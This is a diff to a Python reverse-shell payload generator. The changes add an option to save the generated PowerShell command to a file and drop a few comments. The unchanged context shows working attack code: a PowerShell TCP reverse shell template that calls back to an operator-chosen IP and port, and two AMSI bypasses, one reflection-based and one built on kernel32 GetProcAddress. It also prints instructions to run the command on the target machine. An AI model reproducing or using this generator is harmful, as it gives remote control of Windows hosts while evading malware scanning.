@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 import base64
 import sys
+import os
 
 # --- PAYLOAD COMPONENTS ---
 
-# Basic TCP Reverse Shell
 REVERSE_SHELL_LOGIC = (
     "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
     "$stream = $client.GetStream();"
@@ -18,7 +18,6 @@ REVERSE_SHELL_LOGIC = (
     "$stream.Flush()}};$client.Close()"
 )
 
-# Simple AMSI Bypass
 AMSI_BYPASS_SIMPLE = (
     "$a='System.Management.Automation.A';"
     "$b='msiUtils';"
@@ -27,7 +26,6 @@ AMSI_BYPASS_SIMPLE = (
     "$d.SetValue($null,$true);"
 )
 
-# Advanced AMSI Bypass (fixed formatting for inline use)
 AMSI_BYPASS_ADVANCED = (
     "Add-Type @' using System;using System.Runtime.InteropServices;"
     "public class Win32{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);"
@@ -69,6 +67,27 @@ def print_output(final_command, payload_desc, port):
     print("\n[2] Run this command on the target Windows machine:")
     print(f"\033[93m{final_command}\033[0m\n")
 
+def export_to_file(payload):
+    export_choice = input("Do you want to export the payload to a file? (y/n): ").lower().strip()
+    if export_choice == 'y':
+        file_name = input("Enter filename (default: payload.txt): ").strip() or "payload.txt"
+        if os.path.exists(file_name):
+            overwrite = input(f"[!] File '{file_name}' exists. Overwrite? (y/n): ").lower().strip()
+            if overwrite != 'y':
+                print("[!] Export canceled. Showing payload below.")
+                print(payload)
+                return
+        try:
+            with open(file_name, 'w') as f:
+                f.write(payload)
+            abs_path = os.path.abspath(file_name)
+            print(f"\n[+] Payload saved to: {abs_path}")
+        except Exception as e:
+            print(f"[!] Error saving file: {e}")
+    else:
+        print("\n[!] Payload not exported. Here is the command:")
+        print(payload)
+
 # --- MAIN LOGIC ---
 def main():
     menu = {
@@ -107,8 +126,9 @@ def main():
         # Generate payload
         final_command = generate_final_command(ps_command, use_base64, wrapper)
 
-        # Output
+        # Output + Option to export
         print_output(final_command, desc, lport)
+        export_to_file(final_command)
 
     except (KeyboardInterrupt, EOFError):
         print("\n\n[!] Script terminated by user.")
